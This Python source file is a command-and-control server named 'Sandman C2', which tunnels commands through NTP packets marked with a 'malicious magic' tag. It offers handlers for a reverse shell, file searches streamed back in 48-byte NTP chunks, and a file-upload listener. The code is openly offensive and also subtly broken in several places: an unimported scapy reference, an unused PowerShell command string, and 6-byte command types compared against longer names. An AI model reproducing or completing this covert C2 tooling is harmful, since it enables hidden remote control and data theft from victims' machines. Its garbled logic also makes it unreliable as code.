#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Sandman C2 Server v4.0 - NTP Edition
Features:
  - NTP Heartbeat (0x1B + IDOV31)
  - Hardcoded Payloads:
    1. Reverse Shell (PowerShell Listener)
    2. File Search (Dir C:\...)
    3. File Upload (TCP Listener)
  - Multi-Client Support
"""

import sys
import os
import time
import struct
import socket
import threading
import subprocess
from scapy.all import sniff, IP, UDP, NTP, Ether, Raw

# === CONFIGURATION ===
INTERFACE = "eth0"
SERVER_HOST = "192.168.230.1"
NTP_PORT = 123
SLEEP = 0.2
CHUNK_SIZE = 48
MALICIOUS_MAGIC = b"IDOV31"
MAGIC_BYTE = 0x1B

# === THREAD-SAFE STATE ===
active_threads = {}
lock = __import__("threading").Lock()

def pack_ntp_resp(type_byte, size_bytes, payload_bytes):
    """Create NTP response packet: [Type][Sig][Size][Payload]"""
    header = struct.pack('B', type_byte) + MALICIOUS_MAGIC
    header += struct.pack('>I', size_bytes)
    header += payload_bytes
    return header[:48]  # Pad to 48 bytes

def spawn_reverse_shell(ip_source, ip_dest):
    """Spawn a PowerShell Reverse Shell Listener"""
    try:
        # Example: Listen on port 4444 (Client connects here)
        cmd = f'powershell.exe -c "Start-Sleep -Seconds 1; Start-Process -FilePath C:\\Program Files\\PowerShell\\7\\pwsh.exe -ArgumentList \"-c Start-Sleep -Seconds 1; $port=4444; $listener=\\\"$port\\\"; New-Object System.Net.Sockets.TcpListener $port\""'
        print(f"[+] Spawning Reverse Shell on {ip_source}...")
        p = subprocess.Popen(["cmd", "/c", "start", "min", "C:\\Tools\\reverse_shell_listener.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except Exception as e:
        print(f"[-] Reverse Shell Spawn Error: {e}")
        return False

def run_file_search(ip_source, ip_dest):
    """Execute a local directory search (e.g., dir C:\)")"""
    try:
        # Command: Search for files (Example: dir C:\*)
        cmd = "cmd /c dir C:\\\\*.txt /s /b > C:\\Temp\\dir_result.txt"
        print(f"[+] Running File Search: {cmd}")
        
        # Execute and capture output
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        stdout, stderr = p.communicate()
        
        if stdout:
            print(f"[+] File Search Result: {len(stdout)} bytes")
            # Stream chunks back via NTP (Simplified: Send all in 1 packet)
            # In real scenario, send in 48-byte chunks
            for i in range(0, len(stdout), CHUNK_SIZE):
                chunk = stdout[i:i+CHUNK_SIZE]
                packet = pack_ntp_resp(MAGIC_BYTE, len(chunk), chunk)
                send_udp_packet(packet, ip_source, ip_dest, NTP_PORT)
                time.sleep(SLEEP)
        
        # End-of-Transmission
        packet = pack_ntp_resp(MAGIC_BYTE, 0, b"END")
        send_udp_packet(packet, ip_source, ip_dest, NTP_PORT)
        
    except Exception as e:
        print(f"[-] File Search Error: {e}")

def run_file_upload(ip_source, ip_dest):
    """Open a TCP Listener for File Upload"""
    try:
        # Listen on port 12345 (Client sends file to this port)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", 12345))
        sock.listen(5)
        print(f"[+] Opening TCP Upload Listener on Port 12345...")
        
        while True:
            conn, addr = sock.accept()
            print(f"[+] Received Upload Request from {addr}")
            conn.close()
    except Exception as e:
        print(f"[-] File Upload Error: {e}")

def create_socket_server(ip_source, ip_dest, port, type_name):
    """Helper to create a server socket (for Reverse Shell/Upload)"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((ip_source, port))
        sock.listen(5)
        print(f"[+] Server Listening: {ip_source}:{port}")
        return sock
    except Exception as e:
        print(f"[-] Server Bind Error: {e}")
        return None

# === PACKET SENDER ===
def send_udp_packet(data, src, dst, port):
    """Send UDP packet (NTP format)"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(data, (dst, port))
        return True
    except Exception as e:
        print(f"[-] Send Error: {e}")
        return False

# === HEARTBEAT HANDLER ===
def handle_heartbeat(ip_source, ip_dest, raw_data, src_port, dst_port):
    """Process the heartbeat and trigger the appropriate handler"""
    try:
        # 1. Check Magic & Signature
        raw_bytes = raw_data[:48]
        if len(raw_bytes) < 7:
            return
        
        if raw_bytes[1:7] == MALICIOUS_MAGIC:
            # 2. Extract Command (Next 6 bytes: Type)
            type_data = raw_bytes[7:13]
            type_str = type_data.decode().strip()
            print(f"[+] Received Type: {type_str}")
            
            # 3. Determine Action
            if type_str == "ReverseShell":
                print("[+] Handling ReverseShell...")
                spawn_reverse_shell(ip_source, ip_dest)
                # Send Ack
                ack = pack_ntp_resp(MAGIC_BYTE, 0, b"READY")
                send_udp_packet(ack, ip_source, ip_dest, src_port)
                
            elif type_str == "FileSearch":
                print("[+] Handling FileSearch...")
                run_file_search(ip_source, ip_dest)
                # Send Ack
                ack = pack_ntp_resp(MAGIC_BYTE, 0, b"READY")
                send_udp_packet(ack, ip_source, ip_dest, src_port)
                
            elif type_str == "FileUpload":
                print("[+] Handling FileUpload...")
                sock = create_socket_server(ip_source, ip_dest, 12345, "FileUpload")
                if sock:
                    ack = pack_ntp_resp(MAGIC_BYTE, 0, b"LISTENING")
                    send_udp_packet(ack, ip_source, ip_dest, src_port)
                else:
                    ack = pack_ntp_resp(MAGIC_BYTE, 0, b"ERROR")
                    send_udp_packet(ack, ip_source, ip_dest, src_port)
            
            else:
                print(f"[-] Unknown Type: {type_str}")
                ack = pack_ntp_resp(MAGIC_BYTE, 0, b"UNKNOWN")
                send_udp_packet(ack, ip_source, ip_dest, src_port)
        
        else:
            print(f"[-] No Magic Signature")
            ack = pack_ntp_resp(MAGIC_BYTE, 0, b"NO_MAGIC")
            send_udp_packet(ack, ip_source, ip_dest, src_port)
    
    except Exception as e:
        print(f"[-] Handle Error: {e}")
    finally:
        time.sleep(SLEEP)

# === MAIN LOOP ===
def sniff_loop(interface, filter_str, timeout=5):
    print(f"[+] Starting NTP Sniffer on {interface}...")
    print(f"[+] Filter: {filter_str}")
    
    while True:
        try:
            packet = sniff(iface=interface, filter=filter_str, count=1, timeout=timeout, verbose=0)
            if packet:
                ntp_pkt = packet[0][NTP]
                ip_pkt = packet[0][IP]
                raw = scapy.raw(ntp_pkt)
                
                if raw[1:7] == MALICIOUS_MAGIC:
                    # 4. Extract Magic + Type
                    src_ip = ip_pkt.src
                    dst_ip = ip_pkt.dst
                    src_port = ip_pkt.sport
                    dst_port = ip_pkt.dport
                    
                    # 5. Receive Size (Next 6 bytes: Type)
                    connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    connection.bind((SERVER_HOST, NTP_PORT))
                    
                    # 6. Receive Payload Type
                    type_data = connection.recv(6)
                    type_str = type_data.decode().strip()
                    
                    # 7. Trigger Handler
                    handle_heartbeat(src_ip, dst_ip, type_data, src_port, dst_port)
        
        except Exception as e:
            print(f"[-] Sniff Error: {e}")
        finally:
            time.sleep(SLEEP)

def print_banner():
    print("""
   _____                 _                       
  / ____|               | |                      
 | (___   __ _ _ __   __| |_ __ ___   __ _ _ __  
  \___ \ / _` | '_ \ / _` | '_ ` _ \ / _` | '_ \ 
  ____) | (_| | | | | (_| | | | | | | (_| | | | |
 |_____/ \__,_|_| |_|\__,_|_| |_| |_|\__,_|_| |_|
        Sandman C2 Server
    """)

if __name__ == "__main__":
    print_banner()
    
    if len(sys.argv) >= 2:
        INTERFACE = sys.argv[1]
    if len(sys.argv) >= 3:
        NTP_PORT = int(sys.argv[2])
    
    filter_str = f"udp and port {NTP_PORT}"
    print(f"[+] Starting NTP Sniffer on {INTERFACE}...")
    print("[+] Listening for Heartbeats...")
    
    sniff_loop(INTERFACE, filter_str)
